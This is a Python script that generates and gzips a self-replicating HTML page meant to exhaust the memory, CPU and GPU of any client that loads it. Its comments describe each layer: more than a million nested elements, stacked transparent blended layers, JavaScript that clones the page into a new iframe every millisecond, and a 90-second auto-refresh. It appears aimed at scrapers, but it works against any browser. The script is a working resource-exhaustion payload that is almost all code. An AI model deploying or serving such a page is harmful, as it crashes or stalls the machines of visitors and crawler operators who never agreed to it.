#!/usr/bin/env python3


def createHtml():
    # generates a webpage that tries to exhaust resources in a few different ways. the goal is to use more resources
    # the closer the requester is to a fully featured web browser.
    # 0. the page is highly repetitive: very small file after compression. the goal is to exhaust resources of the
    #    requester while minimizing the impact on the server
    # 1. if the requester tries to build a DOM from the html: more than a million nested elements will use considerable
    #    resources to build and hold in memory. additionally, the error handling is also exercised: the markup is
    #    invalid (div elements must be closed, closing p elements is optional). browsers handles this kind of error
    #    by closing the div right before the end of body. most browser nowadays also limit the nesting depth to ~512
    #    by reparenting the excessively deep elements (https://bugzilla.mozilla.org/show_bug.cgi?id=256180).
    # 2. if the requester hasn't crashed and tries to render the page: the elements are placed on top of each other
    #    and they are also partially transparent. depending on how the requester renders the page it might use
    #    significant gpu or cpu time to create the visual appearance of the page
    # 3. if the requester hasn't crashed after rendering the page and tries to run the javascript: use the rabbit virus
    #    technique to further exhaust resources. infinitely copy itself to new child iframes, which then also
    #    infinitely copy itself to new child iframes, etc. while most modern browsers limit the nesting depth of
    #    iframes and the total amount of browsing contexts (https://github.com/WebKit/WebKit/pull/7219), resource
    #    exhaustion will probably happen earlier than those limits.
    # 4. if all that still didn't exhaust the resources of the requester: reload the page after ~1.5 min to
    #    continuously use resources of the requester
    PREFIX = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="90">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="dark">
<meta name="theme-color" content="black">
<meta name="application-name" content="div">
<meta name="author" content="p">
<meta name="description" content="div">
<meta name="generator" content="p">
<meta name="keywords" content="div">
<meta name="creator" content="p">
<meta name="publisher" content="p">
<title>div</title>
<link rel="icon" href="http://a.invalid/i.ico">
<style>
html, body, div, p, iframe {
box-sizing: border-box;
height: 100%;
width: 100%;
position: absolute;
top: 0;
left: 0;
overflow: hidden;
padding: 0;
margin: 0;
border: 0;
background: radial-gradient(circle, rgba(0, 0, 0, 0.1) 90%, rgba(99, 99, 99, 0.1) 99%);
background-blend-mode: screen;
mix-blend-mode: screen;
opacity: 0.1;
}
</style>
<script>
onload = () => {
const frame = document.createElement("iframe");
frame.sandbox = "allow-scripts";
frame.credentialless = true;
frame.referrerPolicy = "no-referrer";
frame.srcdoc = `<!DOCTYPE html>\n` + document.documentElement.outerHTML;
setInterval(() => document.body.appendChild(frame.cloneNode(true)), 1);
};
</script>
<body>
'''
    ELEM = r'<div><p>'
    elem_arr = [ELEM] * 1048000
    elem_str = ''.join(elem_arr)
    return PREFIX + elem_str


if __name__ == '__main__':
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    with open('public/index.html', mode='wt', encoding='utf-8', newline='\n') as html_file:
        html_file.write(createHtml())
        html_file.flush()

    import subprocess
    subprocess.run(['gzip', '-f', '-n', '-v', '-k', '--best', 'public/index.html'], check=True)
